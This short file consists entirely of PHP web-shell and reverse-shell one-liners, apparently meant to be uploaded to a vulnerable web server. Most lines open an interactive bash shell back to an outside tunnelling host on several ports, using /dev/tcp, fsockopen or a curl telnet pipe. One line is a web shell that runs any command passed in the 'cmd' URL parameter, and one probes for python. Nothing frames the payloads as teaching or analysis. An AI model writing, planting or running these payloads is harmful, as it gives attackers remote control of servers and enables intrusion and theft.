<?=system("/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/tcp-free.tunnel4.com/33159 0>&1'");?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/tcp-free.tunnel4.com/33095 0>&1")?>
<?=system('bash -c bash -i >& /dev/tcp/tcp-free.tunnel4.com/33161 0>&1');?>
<?=shell_exec('which python');?>
<?php $sock=fsockopen("tcp-free.tunnel4.com",33161);exec("bash <&3 >&3 2>&3");?>
<?=exec("/usr/bin/bash -c 'bash -i > /dev/tcp/tcp-free.tunnel4.com/33161 0>&1'");?>
<?=exec("C='curl -Ns telnet://tcp-free.tunnel4.com:33161'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null");?>
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>
<?php $sock=fsockopen("tcp-free.tunnel4.com",33161);passthru("bash <&3 >&3 2>&3");?>